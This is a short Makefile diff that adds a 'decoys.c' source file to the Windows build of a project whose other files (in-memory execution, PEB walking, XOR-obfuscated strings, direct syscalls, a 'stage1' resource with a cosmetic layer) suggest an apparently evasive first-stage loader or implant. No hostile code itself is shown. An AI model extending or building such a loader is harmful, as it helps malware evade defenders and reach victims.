@@ -27,7 +27,7 @@ LINUX_SRCS := $(SHARED_SRCS) src/http_linux.c src/mem_exec_linux.c
 WIN_SRCS := $(SHARED_SRCS) \
             src/http_win.c src/mem_exec_win.c \
             src/peb_walk.c src/api_table.c src/xor_string.c \
-            src/syscalls.c
+            src/syscalls.c src/decoys.c
 
 # Windows resource file (S34 cosmetic layer)
 WIN_RC     := $(RES_DIR)/stage1.rc
